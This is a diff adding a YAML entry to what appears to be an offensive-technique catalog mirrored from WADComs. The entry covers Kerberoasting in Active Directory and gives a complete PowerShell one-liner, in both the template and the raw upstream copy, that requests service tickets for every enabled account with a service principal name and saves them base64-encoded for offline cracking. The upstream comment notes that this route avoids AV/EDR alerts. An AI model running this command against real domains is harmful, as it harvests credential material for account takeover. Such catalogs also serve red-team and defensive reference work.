@@ -1,0 +1,89 @@
+id: wadcoms/PSADmodule-Kerbaroasting
+type: technique
+platform: active-directory
+name: PSADmodule Kerbaroasting
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- powershell
+commands:
+- template: 'Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties
+    ServicePrincipalName | select -ExpandProperty ServicePrincipalName | % { $spn = $_; Add-Type -AssemblyName
+    System.IdentityModel; $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
+    -ArgumentList $spn; $ticketBytes = $ticket.GetRequest(); $ticketBase64 = [System.Convert]::ToBase64String($ticketBytes);
+    $account = (Get-ADUser -Filter {ServicePrincipalName -eq $spn} -Properties SamAccountName).SamAccountName;
+    Write-Output "===== $account : $spn =====`n$ticketBase64" } | Out-File -FilePath "kerberos_tickets.txt"
+    -Encoding ASCII'
+  comment: "Kerberoasting is the act of requesting service tickes for accounts that have an SPN set, and\
+    \ then attempting to crack those hashes offline. \nThis one liner using the powershell AD module serves\
+    \ less as a feasiable attack and more as a PoC that the AD module with some ingenuity\ncan be used\
+    \ to exploit many vectors within AD that you otherwise import tools that are not signed, need obfiscation,\
+    \ require AV/EDR bypass or other\nsteps that may trigger alerts.\n"
+references:
+- https://github.com/samratashok/ADModule
+tags:
+- active-directory
+- wadcoms
+- kerberos
+source_data:
+  WADComs:
+    raw:
+      file: PSADmodule-Kerbaroasting.md
+      document: "---\ndescription: |\n  Kerberoasting is the act of requesting service tickes for accounts\
+        \ that have an SPN set, and then attempting to crack those hashes offline. \n  This one liner\
+        \ using the powershell AD module serves less as a feasiable attack and more as a PoC that the\
+        \ AD module with some ingenuity\n  can be used to exploit many vectors within AD that you otherwise\
+        \ import tools that are not signed, need obfiscation, require AV/EDR bypass or other\n  steps\
+        \ that may trigger alerts.\n\ncommand: |\n  Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"\
+        \ -and Enabled -eq $true} -Properties ServicePrincipalName | select -ExpandProperty ServicePrincipalName\
+        \ | % { $spn = $_; Add-Type -AssemblyName System.IdentityModel; $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken\
+        \ -ArgumentList $spn; $ticketBytes = $ticket.GetRequest(); $ticketBase64 = [System.Convert]::ToBase64String($ticketBytes);\
+        \ $account = (Get-ADUser -Filter {ServicePrincipalName -eq $spn} -Properties SamAccountName).SamAccountName;\
+        \ Write-Output \"===== $account : $spn =====`n$ticketBase64\" } | Out-File -FilePath \"kerberos_tickets.txt\"\
+        \ -Encoding ASCII\n\nitems:\n  - powershell\nservices:\n  - Kerberos\nOS:\n  - Windows\n\nattack_types:\n\
+        \  - Exploitation\nreferences:\n  - https://github.com/samratashok/ADModule\n\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:3bbc379e81b1a3638530331923c03a6b5614e01c276244207303151142ac2edf
